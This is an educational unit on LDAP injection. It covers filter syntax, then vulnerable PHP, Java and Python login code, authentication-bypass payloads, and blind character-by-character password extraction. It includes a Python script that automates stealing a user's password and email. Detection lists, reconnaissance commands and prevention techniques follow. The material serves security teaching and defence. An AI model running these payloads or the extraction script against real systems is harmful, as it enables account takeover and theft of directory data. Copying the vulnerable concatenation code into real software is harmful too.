# Unit 8: Injection Attacks — Topic 2: LDAP Injection

## Overview

**LDAP Injection** is an attack technique that exploits web applications that construct **Lightweight Directory Access Protocol (LDAP)** queries from unsanitized user input. LDAP is the standard protocol for accessing and managing directory services — centralized databases that store information about users, groups, computers, and organizational units within an enterprise network.

When an application builds LDAP queries by directly concatenating user-supplied data, an attacker can manipulate the query logic to:

- **Bypass authentication** (login without valid credentials)
- **Escalate privileges** (modify query to return admin accounts)
- **Exfiltrate sensitive data** (enumerate users, extract attributes like passwords, emails, phone numbers)
- **Modify directory entries** (in write-capable injection scenarios)

LDAP injection is classified under **OWASP A03:2021 – Injection**. It is particularly dangerous in enterprise environments where Active Directory (AD) serves as the authentication backbone for thousands of users.

```
+-----------+        +-------------------+        +---------------------+
|  Attacker | -----> | Web Application   | -----> | LDAP Directory      |
|  (Input)  |        | (Builds LDAP      |        | (Active Directory / |
|           |        |  Query)           |        |  OpenLDAP / etc.)   |
+-----------+        +-------------------+        +---------------------+
      |                      |                             |
      | user=*)(|            | (&(uid=*)(|                 | Returns ALL
      | password=anything    |  (uid=*))(userPassword=     | user entries
      |                      |  anything))                 |
      +----------------------+-----------------------------+
```

---

## 1. LDAP Protocol and Query Structure

### 1.1 What is LDAP?

LDAP (**Lightweight Directory Access Protocol**) is an open, vendor-neutral protocol for accessing and managing distributed directory information services over an IP network. It runs on **TCP port 389** (plaintext) or **TCP port 636** (LDAPS — LDAP over SSL/TLS).

**Key LDAP Concepts:**

| Concept                 | Description                                                              | Example                                    |
|-------------------------|--------------------------------------------------------------------------|--------------------------------------------|
| **Directory**           | Hierarchical database organized as a tree (DIT — Directory Information Tree) | Company's Active Directory                 |
| **Entry**               | A single record in the directory                                         | A user account                             |
| **DN (Distinguished Name)** | Unique identifier for an entry (full path in tree)                   | `cn=John Smith,ou=Users,dc=corp,dc=com`    |
| **RDN (Relative DN)**   | The leftmost component of a DN                                           | `cn=John Smith`                            |
| **Attribute**           | A property of an entry                                                   | `mail`, `uid`, `userPassword`, `cn`        |
| **ObjectClass**         | Schema that defines required/optional attributes                         | `inetOrgPerson`, `posixAccount`            |
| **Base DN**             | The starting point for searches in the DIT                               | `dc=corp,dc=com`                           |
| **Scope**               | How deep to search: `base`, `one` (one level), `sub` (subtree)          | `sub` searches entire tree below base      |

### 1.2 LDAP Directory Tree Structure

```
                        dc=com
                          |
                       dc=corp
                      /       \
                 ou=Users    ou=Groups
                /    |    \        |
          cn=Admin  cn=John  cn=Jane   cn=Admins
          uid=admin uid=john uid=jane
          mail=...  mail=... mail=...
          pass=...  pass=... pass=...
```

### 1.3 LDAP Search Filter Syntax

LDAP uses a **prefix notation** (Polish notation) filter syntax defined in **RFC 4515**:

```
Simple filter:     (attribute=value)
AND filter:        (&(filter1)(filter2))
OR filter:         (|(filter1)(filter2))
NOT filter:        (!(filter))
Wildcard:          (attribute=val*)     — prefix match
                   (attribute=*val)     — suffix match
                   (attribute=*val*)    — substring match
                   (attribute=*)        — presence (attribute exists)
Comparison:        (attribute>=value)   — greater-or-equal
                   (attribute<=value)   — less-or-equal
Approximate:       (attribute~=value)   — approximate match
```

### 1.4 Common LDAP Query Examples

```
# Find user by uid
(uid=john)

# Find user by uid AND verify password (simple bind alternative)
(&(uid=john)(userPassword=secret123))

# Find all users in the directory
(objectClass=person)

# Find users whose name starts with "J"
(cn=J*)

# Find all members of the Admins group
(&(objectClass=group)(cn=Admins))

# Find users with email in corp.com domain
(mail=*@corp.com)

# Complex: active users in IT department
(&(objectClass=person)(department=IT)(!(accountDisabled=TRUE)))
```

### 1.5 LDAP Operations

| Operation     | Description                                          | Injection Risk |
|---------------|------------------------------------------------------|----------------|
| **Bind**      | Authenticate to the directory                        | High           |
| **Search**    | Query the directory with filters                     | High           |
| **Add**       | Create a new entry                                   | Medium         |
| **Modify**    | Change attributes of an existing entry               | Medium         |
| **Delete**    | Remove an entry                                      | Medium         |
| **ModifyDN**  | Rename or move an entry                              | Low            |
| **Compare**   | Test if an entry has a specific attribute value       | Medium         |
| **Unbind**    | Close the connection                                 | None           |

---

## 2. LDAP Injection Attack Vectors

### 2.1 How LDAP Injection Works

Vulnerable code constructs LDAP filters by concatenating user input:

**PHP — Vulnerable:**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Vulnerable LDAP filter construction
$filter = "(&(uid=" . $username . ")(userPassword=" . $password . "))";

$ldap_conn = ldap_connect("ldap://ldap.corp.com");
ldap_bind($ldap_conn, "cn=readonly,dc=corp,dc=com", "readonly_pass");
$result = ldap_search($ldap_conn, "dc=corp,dc=com", $filter);

if (ldap_count_entries($ldap_conn, $result) > 0) {
    echo "Login successful!";
} else {
    echo "Invalid credentials.";
}
?>
```

**Java — Vulnerable:**
```java
String username = request.getParameter("username");
String password = request.getParameter("password");

// Vulnerable filter construction
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";

SearchControls sc = new SearchControls();
sc.setSearchScope(SearchControls.SUBTREE_SCOPE);
NamingEnumeration results = ctx.search("dc=corp,dc=com", filter, sc);
```

**Python — Vulnerable:**
```python
import ldap

username = request.form['username']
password = request.form['password']

# Vulnerable filter construction
search_filter = f"(&(uid={username})(userPassword={password}))"

conn = ldap.initialize('ldap://ldap.corp.com')
conn.simple_bind_s('cn=readonly,dc=corp,dc=com', 'readonly_pass')
results = conn.search_s('dc=corp,dc=com', ldap.SCOPE_SUBTREE, search_filter)
```

### 2.2 LDAP Special Characters

These characters have special meaning in LDAP filters and are the basis for injection:

| Character | Hex Encoding | Meaning in LDAP Filter                     |
|-----------|-------------|----------------------------------------------|
| `*`       | `\2a`       | Wildcard — matches any string                |
| `(`       | `\28`       | Opens a filter group                         |
| `)`       | `\29`       | Closes a filter group                        |
| `\`       | `\5c`       | Escape character                             |
| `NUL`     | `\00`       | Null byte — can truncate queries             |
| `/`       | `\2f`       | Forward slash                                |

### 2.3 Injection Payload Categories

```
Attack Flow for LDAP Injection:

+----------+    username=*)(uid=*))(|(uid=*    +----------------+
| Attacker | --------------------------------> | Web App        |
+----------+                                   +-----+----------+
                                                      |
                                    Constructs filter: |
                           (&(uid=*)(uid=*))(|(uid=*   |
                              )(userPassword=anything)) |
                                                      |
                                                      v
                                               +------+-------+
                                               | LDAP Server  |
                                               | Returns ALL  |
                                               | user entries |
                                               +--------------+
```

---

## 3. Authentication Bypass via LDAP Injection

### 3.1 Basic Authentication Bypass

**Target filter:** `(&(uid=USERNAME)(userPassword=PASSWORD))`

| Payload (Username)       | Payload (Password) | Resulting Filter                                              | Effect                       |
|--------------------------|--------------------|-----------------------------------------------------------------|------------------------------|
| `*`                      | `*`                | `(&(uid=*)(userPassword=*))`                                   | Match any user with any pass |
| `admin)(|(`              | `anything`         | `(&(uid=admin)(|()(userPassword=anything))`                    | OR logic bypass              |
| `*))%00`                 | `anything`         | `(&(uid=*))` (null byte truncates rest)                        | Match all users              |
| `admin)(&)`              | `anything`         | `(&(uid=admin)(&))(userPassword=anything))`                    | Always-true AND              |
| `*)(uid=*))(|(uid=*`     | `anything`         | `(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))`          | Logic manipulation           |

### 3.2 Detailed Bypass Walkthrough

**Scenario:** Login form with LDAP backend

```
Original filter template:
  (&(uid=§USERNAME§)(userPassword=§PASSWORD§))

Attack 1: Wildcard Authentication
  Username: *
  Password: *
  Resulting filter: (&(uid=*)(userPassword=*))
  Effect: Returns all entries where uid and userPassword exist
  Result: Login as first returned user (often admin)
```

```
Attack 2: Null Byte Truncation
  Username: admin)%00
  Password: anything
  Resulting filter: (&(uid=admin)\00)(userPassword=anything))
  Effect: Query is truncated at null byte
  Actual filter processed: (&(uid=admin))
  Result: Login as admin without knowing password
```

```
Attack 3: Always-True Condition
  Username: admin)(&)
  Password: anything
  Resulting filter: (&(uid=admin)(&))(userPassword=anything))
  Effect: (&) is always TRUE in LDAP
  Result: The uid=admin condition is satisfied; password check
          becomes a separate (ignored) expression
```

```
Attack 4: OR Injection
  Username: admin)(|(password=*
  Password: anything))
  Resulting filter: (&(uid=admin)(|(password=*)(userPassword=anything)))
  Effect: OR condition matches any password
  Result: Login as admin
```

### 3.3 Advanced Authentication Bypass Patterns

```bash
# Enumerate valid usernames by observing response differences
Username: admin    Password: invalid   -> "Invalid password" (user exists)
Username: fakeuser Password: invalid   -> "User not found"   (user doesn't exist)

# Use wildcard for username enumeration
Username: a*       Password: *         -> Login success? User starting with 'a' exists
Username: ad*      Password: *         -> Login success? User starting with 'ad' exists
Username: adm*     Password: *         -> Continue narrowing...
Username: admin    Password: *         -> Found! Username is 'admin'
```

---

## 4. Blind LDAP Injection

### 4.1 Understanding Blind LDAP Injection

In blind LDAP injection, the application does not return LDAP data directly. Instead, the attacker infers information from **binary responses** (success/failure, different error messages, or behavioral differences).

```
Blind LDAP Injection Flow:

+----------+    username=admin)(attr=a*))%00    +-----------+    LDAP Query    +------+
| Attacker | ----------------------------------> | Web App  | ---------------> | LDAP |
+----------+                                    +-----+-----+                 +------+
      ^                                               |                          |
      |                                               |      Match / No Match    |
      |   "Login successful" or "Login failed"        | <------------------------+
      +-----------------------------------------------+
      |
      |  "Login successful" = attribute starts with 'a'
      |  "Login failed"     = attribute does NOT start with 'a'
      |
      |  Repeat for each character position to extract full value
```

### 4.2 Blind Attribute Extraction — Character-by-Character

**Goal:** Extract the `userPassword` attribute of user `admin`

**Filter template:** `(&(uid=USERNAME)(userPassword=PASSWORD))`

```
Step 1: Determine password length
  Username: admin)(userPassword=*)%00
  If "Login successful" -> password attribute exists

Step 2: Extract first character
  Username: admin)(userPassword=a*)%00   -> Failed  (not 'a')
  Username: admin)(userPassword=b*)%00   -> Failed  (not 'b')
  ...
  Username: admin)(userPassword=s*)%00   -> Success (starts with 's')

Step 3: Extract second character
  Username: admin)(userPassword=sa*)%00  -> Failed
  Username: admin)(userPassword=sb*)%00  -> Failed
  ...
  Username: admin)(userPassword=se*)%00  -> Success (starts with 'se')

Step 4: Continue until full value extracted
  se -> sec -> secr -> secre -> secret -> secret1 -> secret12 -> secret123
  
  When: admin)(userPassword=secret123)%00 -> Success
  And:  admin)(userPassword=secret123?*)%00 -> Failed
  
  Password extracted: secret123
```

### 4.3 Blind Extraction — Extracting Arbitrary Attributes

```
Extracting the 'description' attribute of user admin:

Template: (&(uid=§INPUT§)(objectClass=*))

# Test if attribute exists
Input: admin)(description=*         -> If match: attribute exists

# Extract value character by character
Input: admin)(description=a*        -> No match
Input: admin)(description=b*        -> No match
...
Input: admin)(description=S*        -> Match! Starts with 'S'
Input: admin)(description=Sy*       -> Match!
Input: admin)(description=Sys*      -> Match!
Input: admin)(description=Sysa*     -> No match
Input: admin)(description=Sysb*     -> No match
...
Input: admin)(description=Sysd*     -> No match
Input: admin)(description=Syste*    -> Match!
Input: admin)(description=System*   -> Match!
...
Extracted: "System Administrator"
```

### 4.4 Attribute Discovery

Discover which attributes exist on an entry:

```
# Test for common LDAP attributes
Input: admin)(cn=*          -> Match  (cn exists)
Input: admin)(sn=*          -> Match  (surname exists)
Input: admin)(mail=*        -> Match  (email exists)
Input: admin)(phone=*       -> No match (no phone)
Input: admin)(title=*       -> Match  (title exists)
Input: admin)(department=*  -> Match  (department exists)
Input: admin)(manager=*     -> Match  (manager exists)
Input: admin)(memberOf=*    -> Match  (group membership exists)
```

**Common LDAP Attributes to Test:**

| Attribute            | Description                          |
|----------------------|--------------------------------------|
| `cn`                 | Common Name                          |
| `sn`                 | Surname                              |
| `uid`                | User ID                              |
| `mail`               | Email address                        |
| `telephoneNumber`    | Phone number                         |
| `userPassword`       | Password (hashed)                    |
| `description`        | Description field                    |
| `title`              | Job title                            |
| `department`         | Department                           |
| `manager`            | Manager DN                           |
| `memberOf`           | Group memberships                    |
| `homeDirectory`      | Home directory path                  |
| `loginShell`         | Login shell                          |
| `objectClass`        | Object class(es)                     |
| `distinguishedName`  | Full DN (AD)                         |
| `sAMAccountName`     | Windows login name (AD)              |
| `userAccountControl` | Account flags (AD)                   |

### 4.5 Automation Script for Blind LDAP Injection

```python
#!/usr/bin/env python3
"""Blind LDAP injection attribute extractor"""

import requests
import string

TARGET = "http://target.com/login"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':\",./<>?"
SUCCESS_INDICATOR = "Welcome"

def extract_attribute(username, attribute):
    """Extract an LDAP attribute value character by character."""
    extracted = ""
    
    while True:
        found_char = False
        for char in CHARSET:
            # Craft blind injection payload
            payload_user = f"{username})({attribute}={extracted}{char}*"
            
            data = {
                'username': payload_user,
                'password': 'anything'
            }
            
            response = requests.post(TARGET, data=data)
            
            if SUCCESS_INDICATOR in response.text:
                extracted += char
                print(f"[+] Found: {extracted}")
                found_char = True
                break
        
        if not found_char:
            break
    
    return extracted

# Usage
password = extract_attribute("admin", "userPassword")
print(f"[+] Extracted password: {password}")

email = extract_attribute("admin", "mail")
print(f"[+] Extracted email: {email}")
```

---

## 5. Filter Manipulation

### 5.1 Manipulating Search Filters

When injection occurs in **search functionality** (not login), attackers can manipulate filters to extract or enumerate directory data.

**Vulnerable Search Code:**
```php
<?php
$search = $_GET['name'];
$filter = "(cn=*" . $search . "*)";  // Search for users by name

$result = ldap_search($conn, "dc=corp,dc=com", $filter);
$entries = ldap_get_entries($conn, $result);

foreach ($entries as $entry) {
    echo "Name: " . $entry['cn'][0] . "<br>";
    echo "Email: " . $entry['mail'][0] . "<br>";
}
?>
```

### 5.2 Filter Manipulation Payloads

```
Original filter: (cn=*SEARCH_TERM*)

# Return all entries
Input: *
Filter: (cn=**)  ->  Matches all entries with cn attribute

# Return entries matching a specific objectClass
Input: *)(objectClass=person)(cn=*
Filter: (cn=**)(objectClass=person)(cn=**)
Note: Some LDAP servers process only the first filter; 
      others may process all if wrapped in OR/AND

# OR injection to match multiple conditions
Input: *)(|(objectClass=*
Filter: (cn=**)(|(objectClass=**)
Effect: Depending on parser behavior, may return all objects

# Extract entries from a different branch
Input: *)(ou=Finance
Filter: (cn=**)(ou=Finance*)
Effect: Filters results to Finance department

# Enumerate groups
Input: *)(objectClass=group)(cn=*
Filter: (cn=**)(objectClass=group)(cn=**)
Effect: May return group objects instead of users
```

### 5.3 AND / OR Filter Manipulation

```
Scenario: Application uses AND filter for search with category

Template: (&(cn=*§SEARCH§*)(department=§DEPT§))

# Inject into SEARCH to override department filter:
SEARCH: *)(department=*))%00
Result: (&(cn=**)(department=*))       [rest truncated by null]
Effect: Returns users from ALL departments

# Inject OR to broaden results:
SEARCH: *)(|(department=Finance)(department=HR)
Result: (&(cn=**)(|(department=Finance)(department=HR))(department=IT))
Effect: May return users from Finance and HR in addition to IT
```

### 5.4 LDAP Injection in Different Contexts

| Injection Point         | Example Template                          | Attack Goal                        |
|------------------------|-------------------------------------------|------------------------------------|
| Login (uid)            | `(&(uid=§INPUT§)(pass=...))`              | Authentication bypass              |
| Login (password)       | `(&(uid=...)(pass=§INPUT§))`              | Authentication bypass              |
| User search            | `(cn=*§INPUT§*)`                          | Data enumeration                   |
| Group lookup           | `(&(objectClass=group)(cn=§INPUT§))`      | Group enumeration                  |
| Email lookup           | `(mail=§INPUT§)`                          | User discovery                     |
| Profile view           | `(uid=§INPUT§)`                           | Attribute extraction               |
| Password reset         | `(&(uid=§INPUT§)(securityQ=...))`         | Security question bypass           |

---

## 6. Detection and Prevention

### 6.1 Detection Techniques

#### Manual Testing Indicators

```
+-----------------------------------+
| Submit LDAP metacharacters:       |
| * ( ) \ | & ! = ~ > < NUL        |
+------------------+----------------+
                   |
                   v
+------------------+----------------+
| Observe application behavior:     |
| - Error messages mentioning LDAP? |
| - Different response for * vs X?  |
| - Server error / stack trace?     |
| - Different content length?       |
+------------------+----------------+
                   |
        +----------+----------+
        |                     |
   +----v------+       +------v------+
   | Error     |       | Behavioral  |
   | Disclosed |       | Difference  |
   +-----------+       +-------------+
   LDAP syntax         Wildcard (*)
   error in            returns different
   response            results than
                       literal text
```

#### Detection Payloads

```bash
# Basic injection test — should cause LDAP syntax error
)(
*)(
*)(&
*))(|(

# Wildcard test — different result than normal text
*
admin*
*admin*

# Boolean test — TRUE vs FALSE conditions
admin)(objectClass=*        # Should be TRUE (always exists)
admin)(objectClass=NONEXIST # Should be FALSE

# Error-triggering payloads
\
)(cn=*
(&(uid=*))
(|)
```

#### Error Messages Indicating LDAP Injection

| Error Message Pattern                                       | LDAP Server Type |
|-------------------------------------------------------------|------------------|
| `javax.naming.NamingException`                              | Java JNDI        |
| `Invalid DN syntax`                                         | OpenLDAP         |
| `ldap_search(): Search: Bad search filter`                  | PHP ldap_search  |
| `LDAPException`                                             | Python python-ldap|
| `Size limit exceeded`                                       | Any (data leak)  |
| `Protocol error`                                            | Any              |
| `Filter error` or `Bad filter`                              | Any              |
| `Operations error`                                          | Active Directory |

### 6.2 Automated Detection Tools

```bash
# Burp Suite — Active Scanner
# Automatically tests for LDAP injection in intercepted parameters

# OWASP ZAP — Active Scanner
# Includes LDAP injection test payloads

# Custom Burp Intruder wordlist for LDAP injection
# Load these payloads into Intruder's payload list:
*
*)(&
*))%00
admin)(|(password=*
*)(uid=*))(|(uid=*
\
)(
*))(|(&
```

#### Nmap LDAP Enumeration (for reconnaissance)

```bash
# Discover LDAP service
nmap -sV -p 389,636 target.com

# LDAP enumeration scripts
nmap -p 389 --script ldap-rootdse target.com
nmap -p 389 --script ldap-search target.com
nmap -p 389 --script ldap-brute target.com

# ldapsearch — manual enumeration (if anonymous bind allowed)
ldapsearch -x -H ldap://target.com -b "dc=corp,dc=com" "(objectClass=*)"
ldapsearch -x -H ldap://target.com -b "dc=corp,dc=com" "(uid=admin)"
ldapsearch -x -H ldap://target.com -s base -b "" "(objectClass=*)" namingContexts
```

### 6.3 Prevention Techniques

#### A. Input Validation and Sanitization

**Escape LDAP special characters:**

```php
<?php
// PHP — ldap_escape() function (PHP 5.6+)
$username = ldap_escape($_POST['username'], '', LDAP_ESCAPE_FILTER);
$password = ldap_escape($_POST['password'], '', LDAP_ESCAPE_FILTER);

$filter = "(&(uid=" . $username . ")(userPassword=" . $password . "))";
// * becomes \2a, ( becomes \28, ) becomes \29, etc.
?>
```

```python
# Python — ldap3 library with safe escaping
from ldap3.utils.conv import escape_filter_chars

username = escape_filter_chars(request.form['username'])
password = escape_filter_chars(request.form['password'])

search_filter = f"(&(uid={username})(userPassword={password}))"
```

```java
// Java — manual escaping function
public static String escapeLDAPFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*':  sb.append("\\2a"); break;
            case '(':  sb.append("\\28"); break;
            case ')':  sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default:   sb.append(c);
        }
    }
    return sb.toString();
}
```

#### B. Use Parameterized LDAP Queries

```java
// Java JNDI — Parameterized search
String filter = "(&(uid={0})(userPassword={1}))";
Object[] filterArgs = { username, password };

NamingEnumeration results = ctx.search(
    "dc=corp,dc=com",
    filter,
    filterArgs,    // Parameters are safely escaped
    searchControls
);
```

#### C. Use LDAP Bind for Authentication

```php
<?php
// Instead of searching with password in filter,
// use LDAP BIND to authenticate
$ldap_conn = ldap_connect("ldap://ldap.corp.com");

// First, find the user DN (with escaped input)
$username = ldap_escape($_POST['username'], '', LDAP_ESCAPE_FILTER);
$filter = "(uid=" . $username . ")";
$result = ldap_search($ldap_conn, "dc=corp,dc=com", $filter);
$entries = ldap_get_entries($ldap_conn, $result);

if ($entries['count'] == 1) {
    $user_dn = $entries[0]['dn'];
    
    // Then BIND as that user — LDAP server validates password
    if (@ldap_bind($ldap_conn, $user_dn, $_POST['password'])) {
        echo "Authentication successful!";
    } else {
        echo "Invalid password.";
    }
} else {
    echo "User not found.";
}
?>
```

#### D. Additional Security Measures

| Measure                          | Description                                                            |
|----------------------------------|------------------------------------------------------------------------|
| **Input allowlisting**           | Accept only alphanumeric characters for usernames                      |
| **Least privilege LDAP account** | Application's LDAP bind account should have read-only access           |
| **Disable anonymous bind**       | Prevent unauthenticated LDAP queries                                   |
| **Enable LDAPS (port 636)**      | Encrypt LDAP traffic with TLS                                         |
| **LDAP access logging**          | Log and monitor all LDAP queries for anomalies                         |
| **Rate limiting**                | Limit login attempts to slow blind extraction                          |
| **Error handling**               | Never expose LDAP error messages to users                              |
| **WAF rules**                    | Block requests containing LDAP metacharacters in suspicious parameters |

### 6.4 Prevention Summary

```
+-----------------------------------------------------------------------+
|                     LDAP Injection Prevention                          |
|                                                                        |
|  +------------------------------------------------------------------+ |
|  | Priority 1: Use LDAP BIND for authentication (not filter-based)  | |
|  +------------------------------------------------------------------+ |
|                                                                        |
|  +------------------------------------------------------------------+ |
|  | Priority 2: Escape all LDAP special characters in input          | |
|  |   * -> \2a    ( -> \28    ) -> \29    \ -> \5c    NUL -> \00     | |
|  +------------------------------------------------------------------+ |
|                                                                        |
|  +------------------------------------------------------------------+ |
|  | Priority 3: Use parameterized LDAP queries (JNDI {0} syntax)    | |
|  +------------------------------------------------------------------+ |
|                                                                        |
|  +------------------------------------------------------------------+ |
|  | Priority 4: Input validation — allowlist expected characters     | |
|  +------------------------------------------------------------------+ |
|                                                                        |
|  +------------------------------------------------------------------+ |
|  | Priority 5: Least privilege LDAP account + access logging        | |
|  +------------------------------------------------------------------+ |
+-----------------------------------------------------------------------+
```

---

## Summary Table

| Concept                        | Key Points                                                                                    |
|--------------------------------|-----------------------------------------------------------------------------------------------|
| **What is LDAP Injection**     | Manipulating LDAP queries via unsanitized input to alter query logic                          |
| **LDAP Filter Syntax**         | Prefix notation: `(&(attr=val)(attr2=val2))`, supports `&`, `\|`, `!`, `*` wildcard          |
| **Key Metacharacters**         | `*` (wildcard), `(` `)` (grouping), `\` (escape), `NUL` (truncation)                         |
| **Auth Bypass**                | Inject `*` as wildcard, null-byte truncation, OR logic injection                              |
| **Blind LDAP Injection**       | Character-by-character extraction using wildcard matching + binary true/false responses        |
| **Filter Manipulation**        | Broadening search results, enumerating attributes, pivoting across organizational units       |
| **Best Prevention**            | LDAP bind for auth, escape special chars, parameterized queries, input allowlisting           |

---

## Revision Questions

1. **Explain the LDAP filter syntax and describe how the AND (`&`), OR (`|`), and NOT (`!`) operators work in LDAP search filters. Provide an example of each.**

2. **A login form uses the LDAP filter `(&(uid=USERNAME)(userPassword=PASSWORD))`. Demonstrate three different LDAP injection payloads that could bypass authentication, and explain how each payload manipulates the filter logic.**

3. **Describe the blind LDAP injection technique for extracting a user's `userPassword` attribute character by character. What is the role of the wildcard (`*`) character in this process, and how does the attacker determine each successive character?**

4. **Compare LDAP injection with SQL injection. What are the similarities and key differences in terms of syntax, exploitation techniques, and available defenses?**

5. **Why is using LDAP BIND for authentication more secure than embedding the password in an LDAP search filter? Explain the architectural difference and how it eliminates the injection vector.**

6. **You are testing a web application's user search feature that constructs the filter `(cn=*SEARCH_TERM*)`. Describe your methodology for detecting and exploiting LDAP injection in this context, including both visible and blind techniques.**

---

*Previous: [01-command-injection.md](01-command-injection.md) | Next: [03-xml-injection.md](03-xml-injection.md)*

---

*[Back to README](../README.md)*
